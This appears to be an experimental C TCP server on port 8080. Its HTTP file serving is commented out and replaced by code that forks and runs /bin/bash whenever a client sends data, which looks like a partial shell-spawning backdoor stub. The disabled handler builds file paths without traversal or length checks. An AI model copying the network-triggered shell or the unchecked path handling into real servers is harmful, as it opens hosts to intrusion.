/* simple server */
#include "srvprg.h"

/* Store Client information in a structure
   as linked list */
#define MAX_REQUEST_SIZE 2047
struct client_info {
  socklen_t address_length;
  struct sockaddr_storage address;
  SOCKET socket;
  char request[MAX_REQUEST_SIZE + 1];
  int received;
  struct client_info *next;
};
// root-node
static struct client_info *clients = 0;

SOCKET
create_socket(const char *host, const char *port) {
  printf("Configuring local address...\n");
  struct addrinfo hints;
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;

  struct addrinfo *bind_address;
  getaddrinfo(host, port, &hints, &bind_address);
  printf("Creating socket...\n");
  SOCKET socket_listen;
  socket_listen = socket(bind_address->ai_family, bind_address->ai_socktype,
                         bind_address->ai_protocol);
  if (!ISVALIDSOCKET(socket_listen)) {
    fprintf(stderr, "socket() failed. (%d)\n", GETSOCKETERRNO());
    exit(1);
  }
  printf("Binding socket to local address...\n");
  if (bind(socket_listen, bind_address->ai_addr, bind_address->ai_addrlen)) {
    fprintf(stderr, "bind() failed. (%d)\n", GETSOCKETERRNO());
    exit(1);
  }
  freeaddrinfo(bind_address);

  printf("Listening...\n");
  if (listen(socket_listen, 10) < 0) {
    fprintf(stderr, "listen() failed. (%d)\n", GETSOCKETERRNO());
    exit(1);
  }
  return socket_listen;
}

// Add Client if needed
struct client_info *get_client(SOCKET s) {
  struct client_info *ci = clients;

  while (ci) {
    if (ci->socket == s) break;
    ci = ci->next;
  }
  // client found, return info
  if (ci) return ci;

  // client not found, create new client
  struct client_info *n =
      (struct client_info *)calloc(1, sizeof(struct client_info));

  if (!n) {
    fprintf(stderr, "Out of memory.\n");
    exit(1);
  }

  n->address_length = sizeof(n->address);
  n->next = clients;
  clients = n;
  return n;
}

// drop client
void drop_client(struct client_info *client) {
  CLOSESOCKET(client->socket);
  struct client_info **p = &clients;

  while (*p) {
    if (*p == client) {
      *p = client->next;
      free(client);
      return;
    }
    p = &(*p)->next;
  }
  fprintf(stderr, "drop client not found.\n");
  exit(1);
}

// get_client_address()
const char *get_client_address(struct client_info *ci) {
  /* Code is not reentrant/threadsafe because of static
     static to be sure, that data of address_buffer is still there after return
     from function. Unfortunately it is now a global variable.
     https://www.ibm.com/docs/en/aix/7.2?topic=programming-writing-reentrant-threadsafe-code
  */
  static char address_buffer[100];
  getnameinfo((struct sockaddr *)&ci->address, ci->address_length,
              address_buffer, sizeof(address_buffer), 0, 0, NI_NUMERICHOST);
  return address_buffer;
}

fd_set wait_on_clients(SOCKET server) {
  fd_set reads;
  FD_ZERO(&reads);
  FD_SET(server, &reads);
  SOCKET max_socket = server;
  struct client_info *ci = clients;

  while (ci) {
    FD_SET(ci->socket, &reads);
    if (ci->socket > max_socket) max_socket = ci->socket;
    ci = ci->next;
  }

  if (select(max_socket + 1, &reads, 0, 0, 0) < 0) {
    fprintf(stderr, "select() failed. (%d)\n", GETSOCKETERRNO());
    exit(1);
  }
  return reads;
}

// void
// serve_resource (struct client_info *client, const char *path)
// {
//   printf ("server_resource %s %s\n", get_client_address (client), path);

//   // default page
//   if (strcmp (path, "/") == 0)
//     path = "/index.html";

//   char full_path[128];
//   sprintf (full_path, "public%s", path);

//   // Windows change / to backslash
// #if defined(_WIN32)
//   char *p = full_path;
//   while (*p)
//     {
//       if (*p == '/')
//         *p = '\\';
//       ++p;
//     }
// #endif

//   FILE *fp = fopen (full_path, "rb");
//   if (!fp)
//     {
//       send_404 (client);
//       return;
//     }
//   // bestimme die Laenge des Files
//   fseek (fp, 0L, SEEK_END);
//   size_t cl = (size_t)ftell (fp);
//   rewind (fp);

//   // get_content_type
//   const char *ct = get_content_type (full_path);

//   // Send content
// #define BSIZE 1024
//   char buffer[BSIZE];
//   sprintf (buffer, "HTTP/1.1 200 OK\r\n");
//   send (client->socket, buffer, strlen (buffer), 0);
//   sprintf (buffer, "Connection: close\r\n");
//   send (client->socket, buffer, strlen (buffer), 0);
//   sprintf (buffer, "Content-Length: %lu\r\n", cl);
//   send (client->socket, buffer, strlen (buffer), 0);
//   sprintf (buffer, "Content-Type: %s\r\n", ct);
//   send (client->socket, buffer, strlen (buffer), 0);
//   sprintf (buffer, "\r\n");
//   send (client->socket, buffer, strlen (buffer), 0);
//   size_t r = fread (buffer, 1, BSIZE, fp);
//   while (r)
//     {
//       send (client->socket, buffer, r, 0);
//       r = fread (buffer, 1, BSIZE, fp); // while solange r >0
//     }
//   fclose (fp);
//   drop_client (client);
// }

int main(void) {
#if defined(_WIN32)
  WSADATA d;
  if (WSAStartup(MAKEWORD(2, 2), &d)) {
    fprintf(stderr, "Failed to initialize.\n");
    return 1;
  }
#endif
  SOCKET server = create_socket(0, "8080");
  while (1) {
    fd_set reads;
    reads = wait_on_clients(server);
    if (FD_ISSET(server, &reads)) {
      // handle new client request
      struct client_info *client = get_client(-1);
      client->socket = accept(server, (struct sockaddr *)&(client->address),
                              &(client->address_length));

      if (!ISVALIDSOCKET(client->socket)) {
        fprintf(stderr, "accept() failed. (%d)\n", GETSOCKETERRNO());
        return 1;
      }
      printf("New connection from %s.\n", get_client_address(client));
    }
    struct client_info *client = clients;
    while (client) {
      struct client_info *next = client->next;
      if (FD_ISSET(client->socket, &reads)) {
        // if (MAX_REQUEST_SIZE == client->received)
        //   {
        //     send_400 (client);
        //     continue;
        //   }
        ssize_t r = recv(client->socket, client->request + client->received,
                         MAX_REQUEST_SIZE - (size_t)client->received, 0);
        // unexcepected error
        if (r < 1) {
          printf("Unexpected disconnect from %s.\n",
                 get_client_address(client));
          drop_client(client);
        } else
        // got receive
        {
          client->received += (int)r;
          client->request[client->received] = 0;

          pid_t pid = fork();
          if (pid == -1) {
            perror("Error to fork a shell");
            return 1;
          } else if (pid == 0) {
            char *args[] = {"/bin/bash", NULL};
            execvp(args[0], args);
            perror("Error in execvp");
            return 1;
          } else {
            // parent process wait fir the child to finish
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status)) {
              printf("\nShell exited with status %d\n", WEXITSTATUS(status));
            } else {
              printf("\nShell did not exit normally.\n");
            }
          }

          // char *q = strstr (client->request, "\r\n\r\n");
          // if (q)
          //   {
          //     // we only handle GET Requests
          //     if (strncmp ("GET /", client->request, 5))
          //       {
          //         send_400 (client);
          //       }
          //     else
          //       {
          //         char *path = client->request + 4;
          //         char *end_path = strstr (path, " ");
          //         if (!end_path)
          //           {
          //             send_400 (client);
          //           }
          //         else
          //           {
          //             *end_path = 0;
          //             serve_resource (client, path);
          //           }
          //       }
          //   } // if(q)
        }
      }
      client = next;
    }
  }  // while(1)
  printf("\nClosing socket...\n");
  CLOSESOCKET(server);
#if defined(_WIN32)
  WSACleanup();
#endif
  printf("Finished.\n");
  return 0;
}